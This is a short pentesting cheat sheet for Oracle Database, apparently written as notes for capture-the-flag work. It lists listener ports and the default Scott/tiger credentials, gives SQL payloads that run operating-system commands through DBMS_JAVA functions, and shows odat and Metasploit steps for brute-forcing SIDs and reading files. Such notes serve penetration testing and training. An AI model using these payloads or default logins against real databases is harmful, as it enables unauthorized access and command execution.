# Oracle
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation.

## Ports
```
1521 Default TCP Listener
1522–1529 Secondary Listeners
1748 TCP Listener
```


# Basic Credentials

```
Username:  Scott
Password:  tiger
```

# Command Execution

```sql
-- 10g R2, 11g R1 and R2: DBMS_JAVA_TEST.FUNCALL()
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL

SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual

-- 11g R1 and R2: DBMS_JAVA.RUNJAVA()
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
```


# Possible Attacks
## Brute-force SID
1. You will need: `odat` and its `sidguesser` to bruteforce with a link provided
2. Use [Metasploit](https://www.metasploit.com/) with `auxiliary(admin/oracle/sid_brute)`
3. Use `sqlplus` to login with the creds or
	1. Read file with odat:
```sh
odat ctxsys -s <ip> -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt
```


# References
- [https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html](https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html)
- [Brute-Force SID - https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)
- [https://secybr.com/posts/oracle-pentesting-best-practices/](https://secybr.com/posts/oracle-pentesting-best-practices/)